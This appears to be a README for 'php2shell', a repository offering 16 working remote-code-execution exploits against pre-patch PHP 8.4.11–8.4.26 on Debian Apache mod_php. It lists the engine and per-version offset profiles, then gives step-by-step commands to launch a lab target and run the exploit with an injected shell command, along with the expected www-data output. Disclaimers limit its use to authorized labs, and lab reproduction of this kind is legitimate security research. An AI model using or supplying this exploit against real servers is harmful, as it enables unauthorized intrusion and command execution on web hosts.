# php2shell 8.4 — Debian Apache (mod_php)

16 working exploits for **pre-patch PHP 8.4** on **Debian + Apache mod_php**
(`apache2handler`) using a `php.ini-production` profile.

> **Authorized use only.** Run this only in your own lab or against a target
> with written authorization. Success means a proof file on the target; no
> proof file means **no RCE**.

Languages: [pt-BR](../../README.md) · [English](README.en.md) · [中文](README.zh.md) ·
[فارسی](README.fa.md) · [العربية](README.ar.md) · [Русский](README.ru.md) ·
[한국어](README.ko.md)




We researched the vulnerability independently from the initial advisory, built a proof of concept in a lab, and then focused on reaching a production container.

## Covered versions (16)

| Range | Versions | stage-3 `s_off` |
|:--|:--|:--|
| 8.4.11–8.4.26 | 16 versions | `0xF8398` |

## What is here

```text
engine/pure_fixed.js     A1→B1→A2→B2 engine
profiles/*.json          16 build profiles: symbols, s_off, requirements
run.js                   selects a profile and runs the engine
target/                  php.ini-production + Apache prefork 150 + index.php
tests/*.test.js   validates all 16 profiles
```

`run.js` runs **one** version at a time and requires a proof file.

## Requirements

- Node.js 20+ on the operator host.
- Docker on the lab target.
- Official `php:<version>-apache` (Debian) with `target/php.ini` and
  `target/apache.conf` mounted.
- A shared volume for the proof (`/out` on the target).

## Quick start (local lab)

```bash
mkdir -p out
docker run -d --name p2s-8426 -p 19300:80 \
  -v "$PWD/target/php.ini:/usr/local/etc/php/php.ini:ro" \
  -v "$PWD/target/apache.conf:/etc/apache2/conf-enabled/zz-prod.conf:ro" \
  -v "$PWD/target/www:/var/www/html:ro" \
  -v "$PWD/out:/out" \
  php:8.4.26-apache

./run.js --version 8.4.26 --host 127.0.0.1 --port 19300 \
  --proof out/p1 --cmd 'id>/out/p1' --retries 4 --probes 6

cat out/p1
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Change `8.4.26` for any covered profile and the image tag accordingly.

## Reading the result

| Output | Meaning |
|:--|:--|
| `out/p1` contains `uid=...` | execution proven |
| engine says “proof” but file is empty | **not RCE**; it failed |
| `leak failed` / `no proof` | no execution; restart the target and retry |

Start each attempt with a clean worker. `run.js` does not restart the
container for you; restart it between attempts.

## Honest limitations

- It runs as `www-data`, not root.
- Results depend on the exact image build; pin the tag/digest when repeating.

## Tests

```bash
node --test
```

## Documentation

- `docs/como-reproduzir.md` — step-by-step and troubleshooting (pt-BR).

## Notice

This is authorized security research material. Do not use it against third
parties without permission. The operator is responsible for its use.